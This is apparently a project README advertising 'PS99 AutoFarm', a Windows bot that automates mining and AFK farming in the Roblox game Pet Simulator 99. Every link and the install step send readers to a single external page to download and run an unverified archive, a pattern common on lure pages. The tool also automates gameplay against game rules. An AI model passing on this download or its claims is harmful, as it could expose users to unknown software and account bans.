# ⛏️ PS99 AutoFarm — Mining Update

<p align="center">
  <a href="https://PS99-AutoFarm.github.io/.github">
    <img src="https://img.shields.io/badge/GET%20PS99%20AUTOFARM-00C853?style=for-the-badge&logo=roblox&logoColor=white" alt="GET PS99 AutoFarm">
  </a>
  <a href="https://PS99-AutoFarm.github.io/.github">
    <img src="https://img.shields.io/badge/MINING%20UPDATE-EXPERIMENTAL-8b5cf6?style=for-the-badge" alt="Mining Update">
  </a>
</p>

<p align="center">
  <a href="https://PS99-AutoFarm.github.io/.github">
    <img src="https://img.shields.io/badge/AUTO%20MINING-✓-2ea44f?style=flat-square" alt="Auto Mining">
  </a>
  <a href="https://PS99-AutoFarm.github.io/.github">
    <img src="https://img.shields.io/badge/AFK%20FARMING-✓-2ea44f?style=flat-square" alt="AFK Farming">
  </a>
  <a href="https://PS99-AutoFarm.github.io/.github">
    <img src="https://img.shields.io/badge/ORES%20TRACKER-✓-2ea44f?style=flat-square" alt="Ore Tracker">
  </a>
  <a href="https://PS99-AutoFarm.github.io/.github">
    <img src="https://img.shields.io/badge/PROFILES-✓-2ea44f?style=flat-square" alt="Profiles">
  </a>
</p>

<p align="center">
  <img src="https://github.com/PS99-AutoFarm/.github/blob/main/assets/image/1.png?raw=true" width="700">
</p>

PS99 AutoFarm is a desktop automation utility designed around the **Mining Update** in Pet Simulator 99. It provides configurable automated mining routines, AFK farming profiles, session statistics, ore tracking, and optional notifications.

The utility is designed to make long mining sessions easier to manage without requiring constant manual interaction.

## ⛏️ Mining Update Support

PS99 AutoFarm is designed specifically around the current Space Mine content.

The utility can be configured for different mining areas and farming goals, allowing users to create dedicated profiles for common activities such as:

- Moon Base farming
- Asteroid Belt farming
- Comet Ice farming
- Nebula Depths farming
- Black Hole Core farming
- Nebulite farming
- Ore collection
- Long AFK sessions
- Resource-focused farming

> **Note:** Available functionality can change when the game receives updates. Game updates may require adjustments to individual farming profiles.

## 🚀 Key Features

- Automated mining routines for Space Mine areas.
- AFK farming mode for extended sessions.
- Automatic movement between configured mining locations.
- Configurable farming priorities.
- Ore and resource tracking.
- Session timer and farming statistics.
- Estimated resources collected per hour.
- Custom farming profiles.
- Automatic return to the selected mining area.
- Inventory monitoring.
- Optional session limits.
- Automatic pause conditions.
- Configurable delays between actions.
- Desktop notifications for important events.
- Lightweight interface designed for background operation.
- Portable configuration.
- Multiple language support.
- Easy profile import and export.

## 💎 Ore Tracking

The built-in resource tracker monitors the materials collected during a farming session.

Example:

```text
╭────────────────────────────────────╮
│          MINING SESSION            │
├────────────────────────────────────┤
│ Session Time       02:14:37        │
│                                    │
│ Moonstone          +12,481         │
│ Star Ruby           +3,217        │
│ Helium-3              +684        │
│ Nebulite               +91        │
│                                    │
│ Estimated / Hour    5,602 ores    │
╰────────────────────────────────────╯
```

The tracker can be reset when starting a new session, allowing users to compare different farming configurations.

## ⚙️ Farming Profiles

Different farming strategies can be saved as independent profiles.

### Nebulite Farm

```text
Area:              Black Hole Core
Priority:          Nebulite
Session Limit:     4 hours
Inventory Check:   Enabled
Notifications:     Enabled
```

### Maximum Resources

```text
Area:              Auto
Priority:          All Ores
Session Limit:     Unlimited
Inventory Check:   Enabled
```

### Long AFK

```text
Area:              Selected
Priority:          Balanced
Session Limit:     8 hours
Notifications:     Enabled
```

Profiles can be exported and shared between installations.

## 📊 Session Statistics

PS99 AutoFarm records useful information about each farming session.

Tracked statistics include:

- Total session duration.
- Total resources collected.
- Resources collected per hour.
- Mining area.
- Selected farming profile.
- Number of completed cycles.
- Pause events.
- Session start and end time.

Example:

```text
SESSION SUMMARY
────────────────────────────

Duration:       03:27:51
Total Ores:     18,421
Average / Hour: 5,323

Nebulite:          127
Star Ruby:       2,841
Moonstone:       9,114
Helium-3:          763
```

## 🔔 Notifications

Optional desktop notifications can be enabled for important events.

Supported notification conditions may include:

- Inventory threshold reached.
- Farming session completed.
- Selected resource obtained.
- Mining area changed.
- Farming paused.
- Connection or game-state interruption detected.

Notifications can be individually enabled or disabled.

## 🛠️ Configuration

Most settings can be changed directly from the application interface.

Example configuration:

```json
{
  "profile": "nebulite-farm",
  "area": "black-hole-core",
  "afk_mode": true,
  "session_limit": 14400,
  "ore_tracking": true,
  "notifications": true
}
```

Configuration files are stored locally and can be backed up or transferred between installations.

## 🖥️ User Interface

The application provides a compact dashboard containing:

```text
┌────────────────────────────────────────┐
│ PS99 AUTOFARM                          │
├────────────────────────────────────────┤
│                                        │
│ Status:        ● RUNNING               │
│ Area:          Black Hole Core         │
│ Profile:       Nebulite Farm           │
│                                        │
│ Session:       01:42:18                │
│ Ores/Hour:     5,481                   │
│ Nebulite:      63                      │
│                                        │
│ [ START ] [ PAUSE ] [ STOP ]           │
│                                        │
└────────────────────────────────────────┘
```

The interface is designed to keep the most important information visible while the farming session is running.

## 💻 System Requirements

PS99 AutoFarm is intended for modern Windows systems.

- **Operating System:** Windows 10 or Windows 11 (64-bit)
- **Memory:** 4 GB RAM or more recommended
- **Storage:** Small amount of free disk space
- **Display:** 1280×720 or higher recommended
- **Internet Connection:** Required for the game
- **Permissions:** Additional permissions may be required depending on the selected automation method

Actual performance depends on the game client, system configuration, and selected farming profile.

## 📥 Installing PS99 AutoFarm

1. Download the latest release of **PS99 AutoFarm** - [CLICK](https://PS99-AutoFarm.github.io/.github).
2. Extract the downloaded archive.
3. Launch the application.
4. Select your preferred farming profile.
5. Choose the desired mining area.
6. Configure session limits and notifications.
7. Start the farming session.
8. Monitor the session statistics from the dashboard.

For the best results, keep the game client running normally and avoid changing the selected game window while an automated session is active.

## 🔄 Restoring Default Settings

If a custom configuration causes unexpected behavior, open:

**Settings → Profiles → Reset to Default**

This removes custom farming parameters and restores the standard configuration.

User-created profiles can also be backed up before resetting the application.

## ⚠️ Important

PS99 AutoFarm is an independent community project and is **not affiliated with, endorsed by, or sponsored by BIG Games or Roblox Corporation**.

Game updates can change mechanics, interfaces, or available mining areas. Some features may therefore require updates after a major Pet Simulator 99 release.

Use automation features responsibly and follow the rules applicable to your Roblox account and the game.

## 📜 License

This project is provided for educational and experimental purposes.

See the `LICENSE` file for the complete license terms.

## ⭐ Support the Project

If PS99 AutoFarm is useful to you:

- ⭐ Star the repository
- 🐛 Report bugs
- 💡 Suggest new mining profiles
- 🔧 Submit improvements
- 📢 Share the project with other PS99 players

### Roadmap

- [x] Space Mine profiles
- [x] AFK farming mode
- [x] Ore tracker
- [x] Session statistics
- [x] Custom profiles
- [x] Desktop notifications
- [x] Advanced resource optimizer
- [x] Automatic profile recommendations
- [x] Mining efficiency graphs
- [x] Discord notifications
- [ ] Community profile library
- [ ] Automatic update detection

---

<p align="center">
  <b>⛏️ Mine smarter. Farm longer. Track everything.</b>
</p>
